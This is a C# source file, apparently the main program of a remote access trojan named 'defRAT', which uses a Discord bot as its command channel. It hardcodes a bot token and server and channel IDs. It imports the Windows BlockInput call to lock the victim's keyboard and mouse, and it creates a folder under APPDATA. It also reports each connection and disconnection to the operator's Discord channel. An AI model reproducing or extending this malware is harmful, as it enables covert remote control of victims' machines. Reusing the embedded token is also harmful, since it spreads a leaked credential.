using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using defRAT.Services;
using Microsoft.Extensions.DependencyInjection;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.IO;
using Timer = System.Timers.Timer;
using System.Diagnostics;
using System.Windows.Forms;

namespace defRAT
{
    class Program
    {
        private DiscordSocketClient _client;

        private string TOKEN = "Nzc0OTIzMTgzMzkxNzY4NTg3.X6e1dA.2S9OdKV4A9zoWxKo6bR_Uv7T8BI";

        public static string RAT_DIR_PATH;
        public static bool BLOCKED = false;

        private ulong GUILD_ID = 774921535206850580;
        private ulong CHANNEL_ID = 774921611786059796;
        static void Main(string[] args)
        {
            new Program().MainAsync().GetAwaiter().GetResult();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

    public async Task MainAsync()
        {
            Thread t = new Thread(() => MessageBox.Show("lllll"));
            t.Start();
            string appdata = Environment.GetEnvironmentVariable("APPDATA");
            RAT_DIR_PATH = Directory.CreateDirectory(appdata + @"\defRat").FullName;

            _client = new DiscordSocketClient();

            var services = ConfigureServices();
            await services.GetRequiredService<CommandHandlingService>().InitializeAsync(services);

            await _client.LoginAsync(TokenType.Bot, TOKEN);
            await _client.StartAsync();
            
            _client.Ready += _client_Ready;
            _client.LoggedOut += _client_LoggedOut;
            
            await Task.Delay(-1);
        }

        private IServiceProvider ConfigureServices()
        {
            return new ServiceCollection()
                .AddSingleton(_client)
                .AddSingleton<CommandService>()
                .AddSingleton<CommandHandlingService>()
                .BuildServiceProvider();
        }

        public async Task _client_Ready()
        {
            await _client.SetActivityAsync(new Game("Connected!"));
            await _client.GetGuild(GUILD_ID).GetTextChannel(CHANNEL_ID).SendMessageAsync("Connected to VM at **"+ DateTime.Now.ToString("HH:mm:ss")+"**");
        }

        private async Task _client_LoggedOut()
        {
            await _client.GetGuild(GUILD_ID).GetTextChannel(CHANNEL_ID).SendMessageAsync("Disconnecting at **" + DateTime.Now.ToString("HH:mm:ss") + "**");
        }
    }
}
